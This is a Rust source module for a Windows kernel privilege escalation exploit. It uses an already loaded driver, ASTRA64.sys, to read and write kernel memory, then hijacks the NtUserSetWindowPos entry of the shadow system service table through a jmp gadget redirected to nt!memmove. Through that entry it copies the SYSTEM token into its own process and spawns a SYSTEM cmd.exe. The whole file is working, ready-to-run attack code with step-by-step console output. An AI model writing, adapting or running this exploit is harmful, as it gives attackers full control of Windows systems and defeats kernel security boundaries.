//! Shadow SSDT hijack → SYSTEM token swap → spawn cmd.exe.
//!
//! Assumes `ASTRA64.sys` is already loaded by the user (we do not manage the
//! SCM lifecycle — `sc.exe` does that). All this module does is open the
//! device and drive the LPE flow on top of the ASTRA / kernel modules.

use std::ffi::CString;
use std::io::Write as _;
use std::mem;

use windows::core::{PCSTR, PWSTR};
use windows::Win32::Foundation::CloseHandle;
use windows::Win32::System::LibraryLoader::{
    GetProcAddress, LoadLibraryExA, LOAD_LIBRARY_FLAGS,
};
use windows::Win32::System::Threading::{
    CreateProcessW, GetCurrentProcessId,
    CREATE_NEW_CONSOLE, PROCESS_INFORMATION, STARTUPINFOW,
};

use crate::astra::{is_kptr, Astra, EX_FAST_REF_MASK, IA32_LSTAR};
use crate::kernel::{
    detect_eprocess_offsets, find_cr3, find_eprocess_by_ptwalk, find_kernel_base,
    find_module_base_walkback, vread_u32, vread_u64, vwrite,
};
use crate::pe::{export_rva, load_image};

// ─── Shadow SSDT descriptor discovery ───────────────────────────────────────

/// Pattern-scan `KeAddSystemServiceTable` for every RIP-relative memory
/// operand and enumerate plausible target RVAs. Caller validates each by
/// reading the candidate as a descriptor pair.
fn shadow_descriptor_candidate_rvas(nt_base: usize) -> Result<Vec<u64>, String> {
    let add_svc = export_rva(nt_base, "KeAddSystemServiceTable")
        .ok_or("KeAddSystemServiceTable not exported")?;
    let scan = unsafe {
        std::slice::from_raw_parts((nt_base + add_svc as usize) as *const u8, 0x400)
    };
    let mut out: Vec<u64> = Vec::new();
    let mut push = |target: u64| {
        for sub in 0..=0x20u64 {
            if target >= sub { out.push(target - sub); }
        }
    };
    let mut i = 0usize;
    while i + 8 <= scan.len() {
        let b = &scan[i..];
        // REX.W + lea/mov  (48 8D/8B/89 + ModRM rip-relative)
        if b[0] == 0x48 && (b[1] == 0x8D || b[1] == 0x8B || b[1] == 0x89) {
            let modrm = b[2];
            if modrm & 0xC7 == 0x05 {
                let disp = i32::from_le_bytes([b[3], b[4], b[5], b[6]]);
                let next_rip = add_svc + (i as u64) + 7;
                let target = (next_rip as i64 + disp as i64) as u64;
                push(target);
                i += 7; continue;
            }
        }
        // cmp qword [rip+disp], imm8  (48 83 3D + disp32 + imm8)
        if b[0] == 0x48 && b[1] == 0x83 && b[2] == 0x3D {
            let disp = i32::from_le_bytes([b[3], b[4], b[5], b[6]]);
            let next_rip = add_svc + (i as u64) + 8;
            let target = (next_rip as i64 + disp as i64) as u64;
            push(target);
            i += 8; continue;
        }
        i += 1;
    }
    out.sort_unstable();
    out.dedup();
    Ok(out)
}

/// Parse the EAX immediate from `win32u!NtUserSetWindowPos`. Returns the
/// service index (bits 0..11). The table selector (bit 12+) must be 1.
fn nt_user_set_window_pos_index(win32u_base: usize) -> Result<u32, String> {
    let rva = export_rva(win32u_base, "NtUserSetWindowPos")
        .ok_or("NtUserSetWindowPos not in win32u.dll")?;
    let p = unsafe {
        std::slice::from_raw_parts((win32u_base + rva as usize) as *const u8, 16)
    };
    if !(p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {
        return Err("unexpected stub prologue".into());
    }
    let eax = u32::from_le_bytes([p[4], p[5], p[6], p[7]]);
    if eax >> 12 != 1 { return Err(format!("table selector = {} (expected 1)", eax >> 12)); }
    Ok(eax & 0xFFF)
}

// ─── Win32k gadget (16-byte aligned `FF 25 disp32` thunks) ──────────────────

struct Gadget { gadget_va: u64, iat_slot_va: u64 }

fn find_gadget(
    mod_base: usize, mod_size: usize, mod_kva: u64, shadow_table_base: u64,
) -> Result<Gadget, String> {
    const LIMIT: i64 = 1 << 27;
    let buf = unsafe { std::slice::from_raw_parts(mod_base as *const u8, mod_size) };

    let mut best: Option<Gadget> = None;
    let mut best_score = i64::MAX;

    let mut i = 0usize;
    while i + 6 <= mod_size {
        if buf[i] == 0xFF && buf[i+1] == 0x25 {
            let disp = i32::from_le_bytes([buf[i+2], buf[i+3], buf[i+4], buf[i+5]]);
            let iat_rva = (i as i64 + 6 + disp as i64) as u64;
            if (iat_rva as usize) >= mod_size { i += 1; continue; }
            let gadget_kva = mod_kva + i as u64;
            let off = gadget_kva as i64 - shadow_table_base as i64;
            if off.abs() < LIMIT {
                let aligned_bonus = if i % 16 == 0 { 0 } else { 1 };
                let score = off.abs() + aligned_bonus;
                if score < best_score {
                    best_score = score;
                    best = Some(Gadget {
                        gadget_va:   gadget_kva,
                        iat_slot_va: mod_kva + iat_rva,
                    });
                }
            }
        }
        i += 1;
    }
    best.ok_or_else(|| format!(
        "no `jmp qword ptr [rip+disp32]` within ±128 MiB of shadow base 0x{:X}",
        shadow_table_base,
    ))
}

// ─── Shadow SSDT entry encoding (28-bit signed offset, low 4 bits preserved) ─

fn encode_entry(target_va: u64, base_va: u64, orig_entry: u32) -> Result<u32, String> {
    let off: i64 = target_va as i64 - base_va as i64;
    if off >= (1 << 27) || off < -(1 << 27) {
        return Err(format!("offset 0x{:X} doesn't fit 28-bit signed", off));
    }
    let off_28 = (off as i32) & 0x0FFF_FFFF;
    Ok(((off_28 << 4) as u32) | (orig_entry & 0x0F))
}

fn decode_entry(entry: u32, base_va: u64) -> u64 {
    (base_va as i64 + ((entry as i32) >> 4) as i64) as u64
}

// ─── GUI thread + win32u stub binding ───────────────────────────────────────

#[link(name = "user32")]
unsafe extern "system" {
    fn IsGUIThread(bConvert: i32) -> i32;
}

type NtUserSetWindowPosFn = unsafe extern "system" fn(
    hwnd: usize, hwnd_after: usize,
    x: i32, y: i32, cx: i32, cy: i32, flags: u32,
) -> i32;

fn resolve_set_window_pos() -> Result<NtUserSetWindowPosFn, String> {
    let c = CString::new("win32u.dll").map_err(|_| "bad name")?;
    let f = CString::new("NtUserSetWindowPos").map_err(|_| "bad name")?;
    let h = unsafe { LoadLibraryExA(PCSTR(c.as_ptr() as _), None, LOAD_LIBRARY_FLAGS(0)) }
        .map_err(|e| format!("LoadLibraryExA(win32u.dll): {e}"))?;
    let p = unsafe { GetProcAddress(h, PCSTR(f.as_ptr() as _)) }
        .ok_or("win32u!NtUserSetWindowPos missing")?;
    Ok(unsafe { mem::transmute(p) })
}

// ─── Shell ──────────────────────────────────────────────────────────────────

fn spawn_shell() {
    let cmd: Vec<u16> = "cmd.exe\0".encode_utf16().collect();
    let mut si = STARTUPINFOW { cb: mem::size_of::<STARTUPINFOW>() as u32, ..Default::default() };
    let mut pi = PROCESS_INFORMATION::default();
    match unsafe {
        CreateProcessW(
            None, Some(PWSTR(cmd.as_ptr() as *mut _)),
            None, None, false, CREATE_NEW_CONSOLE, None, None, &mut si, &mut pi,
        )
    } {
        Ok(_) => {
            println!("[+] SYSTEM shell spawned (PID {})", pi.dwProcessId);
            unsafe { let _ = CloseHandle(pi.hProcess); let _ = CloseHandle(pi.hThread); }
        }
        Err(e) => eprintln!("[-] CreateProcess: {e}"),
    }
}

// ─── Top-level flow ─────────────────────────────────────────────────────────

pub fn run_lpe() -> Result<bool, String> {
    // 1. Open the device + MSR sanity check
    let drv = Astra::open()?;
    println!("[+] Device opened: {}", crate::astra::DEVICE_PATH);

    let lstar = drv.read_msr(IA32_LSTAR)?;
    if !is_kptr(lstar) {
        return Err(format!("MSR read returned non-kernel value 0x{lstar:X}"));
    }
    println!("[+] IA32_LSTAR (KiSystemCall64) = 0x{lstar:X}");

    // 2. CR3 via low-phys PML4 scan
    print!("[*] Discovering kernel CR3 (low-phys PML4 scan)... ");
    std::io::stdout().flush().ok();
    let cr3 = find_cr3(&drv)?;
    println!("0x{cr3:X}");

    // 3. ntoskrnl base via MZ walk-back from LSTAR
    let nt_kbase = find_kernel_base(&drv, cr3, lstar)?;
    println!("[+] nt kernel base = 0x{:X}", nt_kbase);

    // 4. Load on-disk copies (DONT_RESOLVE) for symbol lookups
    let (nt_disk, _)     = load_image("ntoskrnl.exe")?;
    let (win32u_disk, _) = load_image("win32u.dll")?;

    // 5. KeServiceDescriptorTableShadow VA via pattern + validate
    let cands = shadow_descriptor_candidate_rvas(nt_disk)?;
    let mut chosen: Option<(u64, u64, u32, u64, u32)> = None;
    for rva in cands {
        let kdesc_va = nt_kbase + rva;
        let nt_st  = match vread_u64(&drv, cr3, kdesc_va).ok() { Some(v) => v, None => continue };
        let nt_lim = match vread_u32(&drv, cr3, kdesc_va + 0x10).ok() { Some(v) => v, None => continue };
        if !is_kptr(nt_st) || nt_st < nt_kbase || nt_st > nt_kbase + 0x0200_0000 { continue; }
        if !(0x100..=0x400).contains(&nt_lim) { continue; }
        let w_st  = match vread_u64(&drv, cr3, kdesc_va + 0x20).ok() { Some(v) => v, None => continue };
        let w_lim = match vread_u32(&drv, cr3, kdesc_va + 0x30).ok() { Some(v) => v, None => continue };
        if !is_kptr(w_st) { continue; }
        if !(0x400..=0x2000).contains(&w_lim) { continue; }
        chosen = Some((kdesc_va, nt_st, nt_lim, w_st, w_lim));
        break;
    }
    let (kdesc_kva, nt_st, nt_lim, shadow_table_base, shadow_limit) = chosen
        .ok_or("KeServiceDescriptorTableShadow not located")?;
    println!("[+] KeServiceDescriptorTableShadow = 0x{:X}", kdesc_kva);
    println!("[+] NT desc:  ServiceTable=0x{:X} ServiceLimit=0x{:X}", nt_st, nt_lim);
    println!("[+] W32 desc: ServiceTable=0x{:X} ServiceLimit=0x{:X}",
        shadow_table_base, shadow_limit);

    // 6. Win32k host module via walkback + SizeOfImage match against disk PEs
    let win32k_kbase = find_module_base_walkback(&drv, cr3, shadow_table_base, 0x4000)
        .ok_or("win32k host base not found")?;
    println!("[+] win32k host kernel base = 0x{:X}", win32k_kbase);

    let mem_size_hdr = {
        let lfn = vread_u32(&drv, cr3, win32k_kbase + 0x3C)? as u64;
        vread_u32(&drv, cr3, win32k_kbase + lfn + 0x50)?
    } as usize;
    let mut chosen2: Option<(&'static str, usize, usize)> = None;
    for &name in &["win32kbase.sys", "win32kfull.sys", "win32k.sys"] {
        if let Ok((b, sz)) = load_image(name) {
            if sz == mem_size_hdr { chosen2 = Some((name, b, sz)); break; }
        }
    }
    let (win32k_name, w32k_disk, w32k_sz) = chosen2
        .ok_or("could not match a win32k disk image to the loaded module")?;
    println!("[+] win32k host = {} (size 0x{:X})", win32k_name, w32k_sz);

    // 7. NtUserSetWindowPos service index
    let svc_idx = nt_user_set_window_pos_index(win32u_disk)?;
    println!("[+] NtUserSetWindowPos service index = 0x{:X}", svc_idx);
    if (svc_idx as u32) >= shadow_limit {
        return Err("service index out of range".into());
    }

    // 8. Shadow entry — read original
    let entry_va = shadow_table_base + (svc_idx as u64) * 4;
    let orig_entry = vread_u32(&drv, cr3, entry_va)?;
    let orig_target = decode_entry(orig_entry, shadow_table_base);
    println!("[+] shadow_entry @ VA 0x{:X} = 0x{:08X} (target=0x{:X})",
        entry_va, orig_entry, orig_target);

    // 9. Gadget: 16-byte aligned `jmp qword ptr [rip+disp32]` thunk
    let gadget = find_gadget(w32k_disk, w32k_sz, win32k_kbase, shadow_table_base)?;
    println!("[+] Gadget @ VA 0x{:X}  →  IAT slot 0x{:X}",
        gadget.gadget_va, gadget.iat_slot_va);
    let orig_iat = vread_u64(&drv, cr3, gadget.iat_slot_va)?;
    println!("[+] IAT slot original     = 0x{:016X}", orig_iat);

    // 10. nt!memmove
    let memmove_rva = export_rva(nt_disk, "memmove").ok_or("nt!memmove not found")?;
    let memmove_kva = nt_kbase + memmove_rva;
    println!("[+] nt!memmove            = 0x{:X}", memmove_kva);

    // 11. Encode new shadow entry
    let new_entry = encode_entry(gadget.gadget_va, shadow_table_base, orig_entry)?;
    println!("[+] new_entry = 0x{:08X}  (decodes to 0x{:X})",
        new_entry, decode_entry(new_entry, shadow_table_base));

    // 12. EPROCESS list walk
    let my_pid = unsafe { GetCurrentProcessId() };
    println!("\n[*] Walking EPROCESS list for PID 4 and {} via ptwalk...", my_pid);
    let offsets = detect_eprocess_offsets()?;
    let (sys_eproc_va, my_eproc_va) = find_eprocess_by_ptwalk(&drv, cr3, nt_kbase, my_pid)?;
    println!("[+] System EPROCESS VA = 0x{:X}", sys_eproc_va);
    println!("[+] Our    EPROCESS VA = 0x{:X}", my_eproc_va);

    let sys_token       = vread_u64(&drv, cr3, sys_eproc_va + offsets.token)?;
    let my_token_before = vread_u64(&drv, cr3, my_eproc_va  + offsets.token)?;
    println!("[+] System token  = 0x{:016X}", sys_token);
    println!("[+] Our token     = 0x{:016X}", my_token_before);

    let dst_va = my_eproc_va  + offsets.token;
    let src_va = sys_eproc_va + offsets.token;
    println!("[+] memmove(dst=0x{:X}, src=0x{:X}, n=8)", dst_va, src_va);

    // 13. GUI thread + resolve win32u stub
    let r = unsafe { IsGUIThread(1) };
    println!("[*] IsGUIThread(TRUE) → {}", r);
    let nt_user_set_window_pos = resolve_set_window_pos()?;

    // 14. PATCH
    println!("\n[*] Patching shadow entry + IAT slot...");
    vwrite(&drv, cr3, gadget.iat_slot_va, &memmove_kva.to_le_bytes())
        .map_err(|e| format!("iat patch: {e}"))?;
    if let Err(e) = vwrite(&drv, cr3, entry_va, &new_entry.to_le_bytes()) {
        let _ = vwrite(&drv, cr3, gadget.iat_slot_va, &orig_iat.to_le_bytes());
        return Err(format!("entry patch: {e}"));
    }
    println!("[+] Hijack live");

    // 15. TRIGGER
    println!("[*] Triggering NtUserSetWindowPos(dst, src, 8, ...) ...");
    let result = unsafe {
        nt_user_set_window_pos(dst_va as usize, src_va as usize, 8, 0, 0, 0, 0)
    };
    println!("[+] syscall returned 0x{:X}", result);

    // 16. RESTORE
    println!("[*] Restoring shadow entry + IAT slot...");
    let _ = vwrite(&drv, cr3, entry_va, &orig_entry.to_le_bytes());
    let _ = vwrite(&drv, cr3, gadget.iat_slot_va, &orig_iat.to_le_bytes());
    let after_entry = vread_u32(&drv, cr3, entry_va).unwrap_or(0);
    let after_iat   = vread_u64(&drv, cr3, gadget.iat_slot_va).unwrap_or(0);
    if after_entry != orig_entry || after_iat != orig_iat {
        eprintln!("[!] Restore mismatch — entry: 0x{:08X} vs 0x{:08X}, iat: 0x{:X} vs 0x{:X}",
            after_entry, orig_entry, after_iat, orig_iat);
    } else {
        println!("[+] Originals restored");
    }

    // 17. Verify + shell
    let new_tok = vread_u64(&drv, cr3, dst_va).unwrap_or(0);
    println!("\n[*] Our token now = 0x{:016X}  (system was 0x{:016X})", new_tok, sys_token);
    if new_tok & !EX_FAST_REF_MASK == sys_token & !EX_FAST_REF_MASK {
        println!("[+] Token swap successful — spawning SYSTEM cmd...");
        spawn_shell();
        Ok(true)
    } else {
        eprintln!("[-] Token did NOT swap.");
        Ok(false)
    }
}
